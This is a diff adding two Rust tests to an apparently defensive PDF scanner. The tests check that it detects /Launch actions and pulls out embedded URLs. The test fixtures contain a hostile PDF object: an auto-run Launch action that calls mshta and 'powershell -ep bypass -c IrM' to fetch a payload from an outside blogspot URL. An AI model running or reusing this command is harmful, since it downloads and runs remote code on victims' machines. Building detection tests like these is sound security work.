@@ -303,3 +303,79 @@ fn gotor_action_includes_egress_metadata() {
         Some("false")
     );
 }
+
+#[test]
+fn launch_action_parses_win_dict_without_payload_error() {
+    let objects = vec![
+        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
+        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
+        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
+        "4 0 obj\n<< /S /Launch /Win << /F (mshta) /P (javascript:alert(1); powershell -ep bypass -c IrM https://hotelmay21.blogspot.com////phudi.pdf) /D (C:\\\\Windows\\\\System32) /O (open) >> >>\nendobj\n",
+    ];
+    let bytes = build_pdf_with_objects(&objects);
+    let detectors = sis_pdf_detectors::default_detectors();
+    let report =
+        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
+            .expect("scan");
+
+    let launch = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "launch_action_present")
+        .expect("launch_action_present finding");
+
+    assert_eq!(launch.meta.get("launch.win.f").map(String::as_str), Some("mshta"));
+    let launch_params = launch.meta.get("launch.win.p").expect("launch.win.p should be present");
+    assert!(
+        launch_params.contains("powershell") && launch_params.contains("hotelmay21.blogspot.com"),
+        "expected full launch parameter string in launch.win.p"
+    );
+    assert_eq!(launch.meta.get("launch.win.d").map(String::as_str), Some("C:\\Windows\\System32"));
+    assert_eq!(launch.meta.get("launch.win.o").map(String::as_str), Some("open"));
+    assert_eq!(launch.meta.get("launch.target_path").map(String::as_str), Some("mshta"));
+    assert!(
+        !launch.meta.contains_key("payload.error"),
+        "payload.error should not be emitted for successfully parsed /Win dictionaries"
+    );
+}
+
+#[test]
+fn launch_action_extracts_embedded_url_from_win_parameters() {
+    let objects = vec![
+        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
+        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
+        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
+        "4 0 obj\n<< /S /Launch /Win << /F (mshta) /P (javascript:var a='x'; powershell -ep bypass -c \"IrM https://hotelmay21.blogspot.com////phudi.pdf\" ) >> >>\nendobj\n",
+    ];
+    let bytes = build_pdf_with_objects(&objects);
+    let detectors = sis_pdf_detectors::default_detectors();
+    let report =
+        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
+            .expect("scan");
+
+    let embedded_url = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "launch_win_embedded_url")
+        .expect("launch_win_embedded_url finding");
+
+    assert_eq!(
+        embedded_url.meta.get("launch.embedded_url").map(String::as_str),
+        Some("https://hotelmay21.blogspot.com////phudi.pdf")
+    );
+    assert_eq!(
+        embedded_url.meta.get("launch.embedded_source").map(String::as_str),
+        Some("launch.win.p")
+    );
+    assert_eq!(
+        embedded_url.meta.get("uri.domain").map(String::as_str),
+        Some("hotelmay21.blogspot.com")
+    );
+    assert!(
+        embedded_url
+            .evidence
+            .iter()
+            .any(|ev| ev.note.as_ref().is_some_and(|note| note.contains("offset"))),
+        "expected extracted URL evidence to include source offset"
+    );
+}
